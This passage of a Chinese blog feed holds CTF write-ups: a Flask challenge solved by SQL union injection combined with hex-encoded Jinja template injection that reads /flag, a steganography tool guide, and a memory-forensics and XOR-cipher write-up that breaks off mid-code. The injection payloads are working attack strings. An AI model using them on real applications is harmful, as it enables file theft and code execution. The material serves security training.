table_schema&#x3D;database() %23</span><br><span class="line"></span><br><span class="line">comment</span><br></pre></td></tr></table></figure><p>列名</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.105.148.65:29003&#x2F;?username&#x3D;&#39; union select 1,2, group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;comment&#39; %23</span><br><span class="line"></span><br><span class="line">id,username,comment</span><br></pre></td></tr></table></figure><p>一看列名，我也感觉到好像没什么东西（没有一般SQL注入题目的flag列之类的）</p><p>但是，当我抱着试一试的心理使用这个payload时：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.105.148.65:29003&#x2F;?username&#x3D;&#39; union select 1,2, group_concat(comment) from comment%23</span><br></pre></td></tr></table></figure><p>发生了神奇的一幕</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541418660488.png"></p><p><code>render</code>   这不是模板渲染函数吗</p><p>结合<code>flask</code>，确实可能存在SSTI模板注入漏洞！</p><p>于是开始尝试SSTI的思路。</p><h3 id="flask-模板注入测试"><a href="#flask-模板注入测试" class="headerlink" title="flask 模板注入测试"></a>flask 模板注入测试</h3><p>两篇大佬的文章，可以参考一下</p><p>[Flask/Jinja 模板注入](Flask/Jinja 模板注入)</p><p><a href="https://www.colabug.com/2805940.html">用python继承链搞事情</a></p><p>直接</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.105.148.65:29003&#x2F;?username&#x3D;&#39; union select 1,2，&#123;&#123;1+1&#125;&#125; %23</span><br></pre></td></tr></table></figure><p>会出错</p><p>用16进制可以绕过。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.105.148.65:29003&#x2F;?username&#x3D;&#39; union select 1,2,0x7b7b312b317d7d %23</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541419486194.png"></p><p>看来思路是对的，可以绕过并且有效</p><p>继续</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.105.148.65:29003&#x2F;?username&#x3D;&#39; union select 1,2,0x7b7b27272e5f5f636c6173735f5f7d7d %23</span><br><span class="line"></span><br><span class="line">&lt;type &#39;str&#39;&gt;</span><br></pre></td></tr></table></figure><p>看看有哪些可以用的函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.105.148.65:29003&#x2F;?username&#x3D;&#39; union select 1,2,0x7b7b28292e5f5f636c6173735f5f2e5f5f62617365735f5f5b305d2e5f5f737562636c61737365735f5f28295b35395d2e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f7d7d %23</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541424060848.png"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541423847552.png"></p><p>我尝试eval函数执行命令，但是似乎有问题总是返回<code>0</code>，哪位大佬成功了，麻烦联系一下我，我学习一下大佬的姿势。</p><p>于是使用<code>open()</code>函数读取flag</p><p>最终payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;flag&#39;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;47.105.148.65:29003&#x2F;?username&#x3D;&#39; union select 1,2,0x7b7b28292e5f5f636c6173735f5f2e5f5f62617365735f5f5b305d2e5f5f737562636c61737365735f5f28295b35395d2e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f5b276f70656e275d28272f666c616727292e7265616428297d7d %23</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541425337342.png"></p><p><em>比赛时，失误太多了，其实我也有想到模板注入（毕竟提示flask），也想到SQL注入，但是硬是没做出来，太菜了==、学习了学习了</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF中常见隐写术套路</title>
      <link href="/2018/10/22/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%9A%90%E5%86%99%E6%9C%AF%E5%A5%97%E8%B7%AF/"/>
      <url>/2018/10/22/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%9A%90%E5%86%99%E6%9C%AF%E5%A5%97%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近有几场比赛，正好当做准备和复习总结，于是有了本文。本文总结了CTF竞赛中的常见的隐写术的套路和思路。本篇文章不过多的阐述隐写的原理，需要的可以百度看看。</p><h1 id="0x01-工具"><a href="#0x01-工具" class="headerlink" title="0x01 工具"></a>0x01 工具</h1><h2 id="1-1-binwalk-dd-foremost命令"><a href="#1-1-binwalk-dd-foremost命令" class="headerlink" title="1.1 binwalk,dd,foremost命令"></a>1.1 binwalk,dd,foremost命令</h2><p>linux下binwalk命令常用于分析隐写文件，dd命令和<code>foremost</code>命令用于提取文件。</p><ul><li><a href="https://www.freebuf.com/sectool/15266.html">binwalk详解</a></li></ul><p>常用命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk xx.jpg# 查看文件的隐藏信息</span><br><span class="line">binwalk -e xx.jpg   # 自动提取隐藏文件</span><br></pre></td></tr></table></figure><ul><li><a href="https://www.cnblogs.com/jikexianfeng/p/6103500.html">dd命令详解</a></li></ul><p>常用命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ dd if&#x3D;123456cry.jpg of&#x3D;2.zip skip&#x3D;19560 bs&#x3D;1</span><br><span class="line">### if为输入的文件 of为输出的文件  skip为开始偏移量  bs为同时设置读入&#x2F;输出的块大小为bytes个字节</span><br><span class="line">### 通常需要先利用binwalk来确定偏移量，dd命令进行手动提取</span><br><span class="line">29424+0 records in</span><br><span class="line">29424+0 records out</span><br><span class="line">29424 bytes (29 kB, 29 KiB) copied, 0.0604124 s, 487 kB&#x2F;s</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><a href="https://blog.csdn.net/xingyyn78/article/details/79303171">foremost命令参数中文说明</a></li></ul><p>常用命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foremost 123456cry.jpg</span><br><span class="line">foremost 123456cry.jpg -T</span><br><span class="line"> - T 表示用时间戳命名文件（防止命名重复）</span><br><span class="line"> foremost -v -i baozou_new.jpg -o &#x2F;root&#x2F;Desktop&#x2F;xx</span><br><span class="line"> -i 输入文件 -o 输出文件-路径  -v在屏幕上显示详细信息</span><br></pre></td></tr></table></figure><p>有时binwalk直接提取文件时，容易弄错偏移量导致文件出现问题，可以通过foremost 和dd命令进行提取。</p><h2 id="1-2-winhex-和-01editor等二进制工具"><a href="#1-2-winhex-和-01editor等二进制工具" class="headerlink" title="1.2 winhex 和 01editor等二进制工具"></a>1.2 winhex 和 01editor等二进制工具</h2><p>此类为二进制工具，在自动分析工具分析不出来时，只能利用此类工具判断文件头和文件尾，从而得到相应的文件边界，然后提取出来。</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="1-3-StegSolve"><a href="#1-3-StegSolve" class="headerlink" title="1.3 StegSolve"></a>1.3 StegSolve</h2><p>一款基于Java 的集成型隐写解密工具，对于LSB隐写和多通道的查看非常有效，还可以和别的图片比较和运算。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181030/BGi6H6dBcl.png?imageslim" alt="mark"></p><hr><p>一般来说，上面几个工具就够用了，但是很多CTF如果想考脑洞的话，上述工具并不够，下面介绍一些其他隐写工具，可能不全、、、</p><h2 id="1-4-steghide"><a href="#1-4-steghide" class="headerlink" title="1.4 steghide"></a>1.4 steghide</h2><p><strong>一般隐藏一些txt文本</strong></p><p>官网地址：<a href="http://steghide.sourceforge.net/documentation.php">http://steghide.sourceforge.net/documentation.php</a><br>在文件中隐藏数据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steghide –embed -cf &#x2F;root&#x2F;Desktop&#x2F;1111.jpg -ef &#x2F;root&#x2F;Desktop&#x2F;embeddate</span><br></pre></td></tr></table></figure><p>检查图片中隐藏的信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steghide info &#x2F;root&#x2F;Desktop&#x2F;1111.jpg</span><br><span class="line">steghide extract -sf background.jpg</span><br></pre></td></tr></table></figure><h2 id="1-5-F5-steganography"><a href="#1-5-F5-steganography" class="headerlink" title="1.5 F5-steganography"></a>1.5 F5-steganography</h2><p><strong>F5隐写</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;matthewgao&#x2F;F5-steganography</span><br><span class="line">cd F5-steganography</span><br><span class="line">java Extract ..&#x2F;123456.jpg -p 123456</span><br></pre></td></tr></table></figure><p>后会生成output.txt文件，里面就有flag了</p><h2 id="1-6-mp3stego"><a href="#1-6-mp3stego" class="headerlink" title="1.6 mp3stego"></a>1.6 mp3stego</h2><p>  <a href="http://www.petitcolas.net/steganography/mp3stego/">mp3stego 下载链接</a></p><p>主要用于mp3隐写,<strong>一般就是在mp3里面隐藏一段文本,需要密码</strong><br>使用非常简单</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加密:encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3</span><br><span class="line">解密：decode -X -P pass svega_stego.mp3</span><br></pre></td></tr></table></figure><h2 id="1-7-Audacity"><a href="#1-7-Audacity" class="headerlink" title="1.7 Audacity"></a>1.7 Audacity</h2><p><a href="https://sourceforge.net/projects/audacity/">下载链接</a></p><p>一般用于分析mp3或者其他音乐文件的波形。通过波形做一些转换，得到flag。</p><h2 id="1-8-BrainTools"><a href="#1-8-BrainTools" class="headerlink" title="1.8 BrainTools"></a>1.8 BrainTools</h2><p>下载链接：<a href="https://pan.baidu.com/s/1Mo0FS_DVVXbcOgUtEQfcIg">https:pan.baidu.com/s/1Mo0FS_DVVXbcOgUtEQfclg</a>   密码：i6xb</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bftools.exe decode braincopter doge.png --output --dogeout.png</span><br><span class="line">bftools.exe run --dogeout.png</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181030/GiD5C62eE6.png?imageslim" alt="mark"></p><h2 id="1-9-盲水印"><a href="#1-9-盲水印" class="headerlink" title="1.9 盲水印"></a>1.9 盲水印</h2><p><a href="https://github.com/chishaxie/BlindWaterMark">github上的项目</a></p><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><pre><code>Usage: python bwm.py &lt;cmd&gt; [arg...] [opts...]  cmds:    encode &lt;image&gt; &lt;watermark&gt; &lt;image(encoded)&gt;           image + watermark -&gt; image(encoded)    decode &lt;image&gt; &lt;image(encoded)&gt; &lt;watermark&gt;           image + image(encoded) -&gt; watermark  opts:    --debug,          Show debug    --seed &lt;int&gt;,     Manual setting random seed (default is 20160930)    --alpha &lt;float&gt;,  Manual setting alpha (default is 3.0)</code></pre><p>需要相应的py包和依赖。</p><h2 id="1-10-LSB密写工具cloacked-pixel"><a href="#1-10-LSB密写工具cloacked-pixel" class="headerlink" title="1.10 LSB密写工具cloacked-pixel"></a>1.10 LSB密写工具cloacked-pixel</h2><p><a href="https://github.com/livz/cloacked-pixel">github项目地址</a></p><p><strong>Hide</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python lsb.py hide samples&#x2F;orig.jpg samples&#x2F;secret.zip p@$5w0rD</span><br><span class="line">[*] Input image size: 640x425 pixels.</span><br><span class="line">[*] Usable payload size: 99.61 KB.</span><br><span class="line">[+] Payload size: 74.636 KB </span><br><span class="line">[+] Encrypted payload size: 74.676 KB </span><br><span class="line">[+] samples&#x2F;secret.zip embedded successfully!</span><br></pre></td></tr></table></figure><p><strong>Extract</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python lsb.py extract samples&#x2F;orig.jpg-stego.png out p@$5w0rD </span><br><span class="line">[+] Image size: 640x425 pixels.</span><br><span class="line">[+] Written extracted data to out.</span><br><span class="line"></span><br><span class="line">$ file out </span><br><span class="line">out: Zip archive data, at least v1.0 to extract</span><br></pre></td></tr></table></figure><h2 id="1-11-Strings命令"><a href="#1-11-Strings命令" class="headerlink" title="1.11 Strings命令"></a>1.11 Strings命令</h2><p><strong>strings使用方法</strong></p><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</p><p>选项：</p><ul><li>-a –all：扫描整个文件而不是只扫描目标文件初始化和装载段</li><li>-f –print-file-name：在显示字符串前先显示文件名</li><li>-t –radix={o,d,x} ：输出字符的位置，基于八进制，十进制或者十六进制</li><li>-e –encoding={s,S,b,l,B,L} ：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit</li></ul><p>Tips 我们使用strings + 文件名字的命令即可</p><h1 id="0x02-图片隐写的常见思路"><a href="#0x02-图片隐写的常见思路" class="headerlink" title="0x02 图片隐写的常见思路"></a>0x02 图片隐写的常见思路</h1><h2 id="2-1-简单套路"><a href="#2-1-简单套路" class="headerlink" title="2.1 简单套路"></a>2.1 简单套路</h2><ol><li>右键属性在备注等地方可能出现提示信息</li><li>winhex打开或者记事本打开，在末尾或者头或者中间会有提示信息</li><li>png图片可以调整图片高度和宽度，可能在边上有隐藏信息。</li><li>stgesolve改变偏移量，或许也能发现一些信息哦</li></ol><h2 id="2-2-附加式的图片隐写"><a href="#2-2-附加式的图片隐写" class="headerlink" title="2.2 附加式的图片隐写"></a>2.2 附加式的图片隐写</h2><blockquote><p>在附加式的图片隐写术中，我们通常是用某种程序或者某种方法在载体文件中直接附加上需要被隐写的目标，然后将载体文件直接传输给接受者或者发布到网站上，然后接受者者根据方法提取出被隐写的消息，这一个过程就是我们这里想提到的附加式图片隐写。</p><p>而在CTF赛事中，关于这种图片隐写的大概有两种经典方式，一是直接附加字符串，二是图种的形式出现。</p></blockquote><p>附加字符串的形式有很多，主要利用strings就可以查看，往往会看出一些东西。</p><p>还有很多的隐写本质上都是附加一段字符串：steghide、F5隐写、MP3stego、BrainTools（Brainfuck隐写）</p><p>图种式的应该也是很常见的了，不多说了，利用binwalk。</p><h2 id="2-3-基于文件结构的图片隐写"><a href="#2-3-基于文件结构的图片隐写" class="headerlink" title="2.3 基于文件结构的图片隐写"></a>2.3 基于文件结构的图片隐写</h2><p>这里一般都是图片文件里面隐藏着一个压缩包之类的。或者图片里面还隐藏着图片。</p><p>往往需要通过binwalk和winhex查看才能看出来。</p><h2 id="2-4-基于LSB的隐写"><a href="#2-4-基于LSB的隐写" class="headerlink" title="2.4 基于LSB的隐写"></a>2.4 基于LSB的隐写</h2><p>LSB原理我就不多说了。LSB隐写一般有两种：一种是在各个0通道的数据组合成为新的文件如txt，zip等等。还有一种是0通道的数据只是一段字符串，即cloacked-pixel形式。</p><p>一般来说，stegsolve查看各色0通道都是类似的数据点阵，又和原图片形状不太像，往往就是LSB了。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181030/bF75Ag7jKL.jpg?imageslim" alt="mark"></p><h2 id="2-5-双图"><a href="#2-5-双图" class="headerlink" title="2.5 双图"></a>2.5 双图</h2><p>双图一般有这么几种解法：</p><ol><li><p>运算，对，两张图的运算</p><p>图的本质就是三维或者一维矩阵嘛，两张图的话，往往通过一些如<code>SUB(减法)</code>，<code>XOR（异或）</code>等运算，可以得到一些其他的信息。</p></li><li><p>盲水印</p></li></ol><h1 id="0x03-一般步骤"><a href="#0x03-一般步骤" class="headerlink" title="0x03 一般步骤"></a>0x03 一般步骤</h1><ol><li>属性，记事本，winhex看看有没有提示信息</li><li>binwalk foremost看看</li><li>stegsolve 各个通道看看，符合LSB就提取试试</li><li>上面步骤都没发现什么信息的话，就在看看题目的提示，结合提示去找找相应的资料和隐写术</li></ol><h1 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h1><p><a href="https://xz.aliyun.com/t/1833">Misc 总结 —-隐写术之图片隐写(一）</a></p><p><a href="https://xz.aliyun.com/t/1836">Misc 总结 —-隐写术之图片隐写(二）</a></p><p><a href="https://xz.aliyun.com/t/1844">Misc 总结 —-隐写术之图片隐写(三）</a></p><p><a href="https://xz.aliyun.com/t/1875">Misc 总结 —-隐写术之图片隐写(四）</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>护网杯后记-学习笔记</title>
      <link href="/2018/10/18/%E6%8A%A4%E7%BD%91%E6%9D%AF%E5%90%8E%E8%AE%B0-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/10/18/%E6%8A%A4%E7%BD%91%E6%9D%AF%E5%90%8E%E8%AE%B0-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前参加护网杯，因为太菜，没做几个题。可能是WP发的早，WP竟然广为流传，是我第一篇阅读量突破3000+的博客，还是感谢队友们（<a href="https://daolgts.github.io/">道萝岗特森</a>、<a href="http://wzt.ac.cn/">WCatalpa.T</a>）的强力输出，实在诚惶诚恐。想着，以后也要更加努力的去学习啊，毕竟这么菜，被叫大佬有点不好意思==。先从护网杯的几道没做出的题开始，来学习吧。</p><h1 id="0x01-Easy-dump"><a href="#0x01-Easy-dump" class="headerlink" title="0x01 Easy_dump"></a>0x01 Easy_dump</h1><p>比赛时，这个题用了很多的还原工具，花了很多时间，但是都没做出来。。。</p><p>后来发现还原工具都是假的==、<code>disk genius</code>提出来的图片是空数据。</p><p>这是一个取证分析题，很久以前做过类似的取证分析，但是很久没做过了，有些忘记了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f easy_dump.img imageinfo</span><br><span class="line"><span class="comment"># 直接用volatility的imageinfo查看镜像，发现是windows内存镜像，并且可以看到版本信息</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181016/6H4B2lC3bC.png?imageslim" alt="mark"></p><p>volatility提供很多查看当时系统状态信息的指令，我们先用pslist查看当时的进程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.vmem --profile&#x3D;WinXPSP2x86 pslist</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# volatility -f easy_dump.img --profile&#x3D;Win7SP1x64 pslist</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          </span><br><span class="line">------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------</span><br><span class="line">0xfffffa8007d0ab30 System                    4      0     88      483 ------      0 2018-10-02 11:55:08 UTC+0000                                 </span><br><span class="line">0xfffffa8008c5b4f0 smss.exe                260      4      2       29 ------      0 2018-10-02 11:55:08 UTC+0000                                 </span><br><span class="line">...</span><br><span class="line">...                    </span><br><span class="line">0xfffffa800a3c7b30 explorer.exe           1456   1404     34     1007      1      0 2018-10-02 11:55:11 UTC+0000                                 </span><br><span class="line">0xfffffa800a44eb30 vmtoolsd.exe           1568   1456      9      215      1      0 2018-10-02 11:55:12 UTC+0000                                 </span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0xfffffa8009ce58b0 DumpIt.exe             1476   1456      1       23      1      1 2018-10-02 11:59:30 UTC+0000                                 </span><br><span class="line">0xfffffa80095f1b30 conhost.exe             344    408      2       57      1      0 2018-10-02 11:59:30 UTC+0000                               </span><br></pre></td></tr></table></figure><p>受篇幅制约，这里只列举部分进程，可以看到有常见的<code>NotePad.exe</code>，<code>explorer.exe</code>,还有一个可疑的进程<code>DumpIt</code></p><p>尝试查看NotePad中是否有什么隐藏信息，volatility中notepad插件，可以很方便的查看notepad进程的记录：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility notepad -f easy_dump.img pslist --profile&#x3D;Win7SP0x64</span><br></pre></td></tr></table></figure><p>但是没发现什么有用的提示之类的东西。</p><p>再尝试从其他程序入手。volatility中iehistoty插件，可以很方便的查看ie浏览器的浏览记录。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">**************************************************</span><br><span class="line">Process: 1260 explorer.exe</span><br><span class="line">Cache type &quot;URL &quot; at 0x4235000</span><br><span class="line">Record length: 0x100</span><br><span class="line">Location: :2018093020181001: n3k0@file:&#x2F;&#x2F;&#x2F;C:&#x2F;phos.jpg</span><br><span class="line">Last modified: 2018-09-30 13:19:21 UTC+0000</span><br><span class="line">Last accessed: 2018-09-30 05:19:21 UTC+0000</span><br><span class="line">File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0</span><br><span class="line">**************************************************</span><br><span class="line">Process: 1260 explorer.exe</span><br><span class="line">Cache type &quot;URL &quot; at 0x4235100</span><br><span class="line">Record length: 0x100</span><br><span class="line">Location: :2018093020181001: n3k0@:Host: ?????????</span><br><span class="line">Last modified: 2018-09-30 12:43:38 UTC+0000</span><br><span class="line">Last accessed: 2018-09-30 04:43:38 UTC+0000</span><br><span class="line">File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0</span><br><span class="line">**************************************************</span><br><span class="line">Process: 1260 explorer.exe</span><br><span class="line">Cache type &quot;URL &quot; at 0x4235200</span><br><span class="line">Record length: 0x100</span><br><span class="line">Location: :2018093020181001: n3k0@file:&#x2F;&#x2F;&#x2F;C:&#x2F;phos.jpg</span><br><span class="line">Last modified: 2018-09-30 13:30:14 UTC+0000</span><br><span class="line">Last accessed: 2018-09-30 05:30:14 UTC+0000</span><br><span class="line">File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0</span><br><span class="line">**************************************************</span><br></pre></td></tr></table></figure><p>提示指向了一个文件<code>phos.jpg</code>，可能是有东西的，于是利用<code>filescan</code>命令找到文件位置。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# volatility -f .&#x2F;easy_dump.img --profile&#x3D;Win7SP1x64 filescan | grep phos.jpg</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">0x0000000023e067e0     32      0 RW---- \Device\HarddiskVolume1\phos.jpg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>记下偏移<code>0x0000000023e067e0</code>，使用dumpfiles把这张图片dump出来。</p><p>命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f .&#x2F;easy_dump.img --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x0000000023e067e0 --name -D .&#x2F;res</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# volatility -f .&#x2F;easy_dump.img --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x0000000023e067e0 --name -D .&#x2F;res</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">DataSectionObject 0x23e067e0   None   \Device\HarddiskVolume1\phos.jpg</span><br><span class="line">SharedCacheMap 0x23e067e0   None   \Device\HarddiskVolume1\phos.jpg</span><br></pre></td></tr></table></figure><p>打开文件，没有直接发现flag，猜测下面是图片隐写了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e file.None.0xfffffa800a488e10.phos.jpg.vacb </span><br></pre></td></tr></table></figure><p>得到一个压缩包(伪加密，解压就是.img)和一个<code>.img</code>镜像</p><p>strings查看.img文件，发现字符串<code>yispyweih!uokt_jwyx_snh_gzfne</code>和一堆二位数字对，怀疑是类似坐标之类的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings message.img </span><br><span class="line">&#x2F;root&#x2F;ctf&#x2F;message</span><br><span class="line">5NRt</span><br><span class="line">lost+found</span><br><span class="line">.message.swp</span><br><span class="line">hint.txt</span><br><span class="line">.Trash-0</span><br><span class="line">b0VIM 8.0</span><br><span class="line">n3k0</span><br><span class="line">shiki-2.local</span><br><span class="line">~n3k0&#x2F;work&#x2F;HuWangBei&#x2F;6&#x2F;message</span><br><span class="line">U3210</span><br><span class="line">#&quot;! </span><br><span class="line">yispyweih!uokt_jwyx_snh_gzfne</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">41 119</span><br><span class="line">41 120</span><br><span class="line">41 121</span><br><span class="line">41 132</span><br><span class="line">41 133</span><br><span class="line">41 134</span><br><span class="line">41 135</span><br><span class="line">41 136</span><br><span class="line">41 137</span><br><span class="line">41 138</span><br><span class="line">41 139</span><br><span class="line">41 140</span><br><span class="line">41 141</span><br><span class="line">41 142</span><br><span class="line">41 1</span><br></pre></td></tr></table></figure><p>通过数量（256*256）推测这个数据代表二维码上的黑点和白点 脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image,ImageDraw</span><br><span class="line"></span><br><span class="line">width = <span class="number">300</span></span><br><span class="line">height = <span class="number">300</span></span><br><span class="line">image = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(width,height))</span><br><span class="line">draw = ImageDraw.Draw(image)</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">&#x27;hint.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    x = int(i.split()[<span class="number">0</span>])</span><br><span class="line">    y = int(i.split()[<span class="number">1</span>])</span><br><span class="line">    draw.point((x, y), fill=(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">image.save(<span class="string">&#x27;res.jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);</span><br></pre></td></tr></table></figure><p>得到二维码</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181016/69d41h2fFl.jpg?imageslim" alt="mark"></p><p>扫码得到hint：</p><p><code>Here is the vigenere key: aeolus, but i deleted the encrypted message。</code></p><p>之前的密文是维吉尼亚密码，key是<code>aeolus</code></p><p><a href="http://ctf.ssleye.com/vigenere.html">在线解密</a>得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag：yeeeeeeet!just_find_and_solve</span><br></pre></td></tr></table></figure><h1 id="0x02-fez"><a href="#0x02-fez" class="headerlink" title="0x02 fez"></a>0x02 fez</h1><p>这个题一开始思路错了，后来是<strong>道萝岗特森大佬</strong>发现出题人的思路，顺利输出。</p><blockquote><p>我的思路：</p><p>因为test是已知的，第一次fez的调用中用到了test和K，并且密文也是已知的，那么能不能解出来K，然后去解flag？于是回到round函数，可以看到最后一次加密结束时，用到的是K7,那么最后一次的E_L和E_R我们是知道的，我们能不能推出前一次的L和R，也就是没有经过轮加密的L和R，我们已经知道下一轮的密文L等于上一轮的R，下一轮的R等于上一轮的R异或L再异或当前轮所使用的K，那么很容易得出我们能获得上一轮所使用的明文的右半部分，有了上一轮的右半部分，加密后的新的右半部分，如果我们求出上一轮的左边的部分，就能求出当前轮所使用的K，但是根绝目前已知的所有条件，上一轮的明文的左半部分是无法求出的，卡在这里了很长时间，结果无奈放弃了</p><p>dlgts大哥的思路：</p><p>正向来模拟加密的过程，来发现是否存在漏洞，在round函数中，新一轮的左半部分等于上一轮的右半部分，下一轮的右半部分等于上一轮的左右两部分异或之后再和当前轮的K异或，产生的新一轮的左右两部分拼接成为新的密文。</p></blockquote><p>知识点：</p><ul><li><p>相同的数异或为0</p></li><li><p>0异或任何数还是其本身</p></li></ul><p>于是开始模拟：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一轮：R+R^L^K1</span><br><span class="line">第二轮：R^L^K1 + R^R^L^K1^K2&#x3D;&gt;R^L^K1+L^K1^K2（之后原理一致，不保留中间过程）</span><br><span class="line">第三轮：L^K1^K2 + R^K2^K3</span><br><span class="line">第四轮：R^K2^K3 + L^R^K1^K3^K4</span><br><span class="line">第五轮：L^R^K1^K3^K4 + L^K1^K2^K4^K5</span><br><span class="line">第六轮：L^K1^K2^K4^K5 + R^K2^K3^K5^k6</span><br><span class="line">第七轮：R^K2^K3^K5^k6 + R^L^K1^K3^K4^K6^K7【res】</span><br></pre></td></tr></table></figure><blockquote><p>结果由K变量和初始的明文的两部分组成  </p><p>又因为在包含flag的m变量中进行了相同的fez函数加密，所以和test调用fez函数以后的结果形式是相同的，只是初始的明文不同，又因为根据异或运算的计算逻辑，相同的数异或为0，0异或任何数还是其本身，所以即使我们不知道K变量是什么，因为两次运算结果的K盒子在结果中的形式相同，所以可以抵消掉。</p></blockquote><p>即由于test变量是用同样的算法得到的，所以test的最终结果为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rtest^K2^K3^K5^k6 + 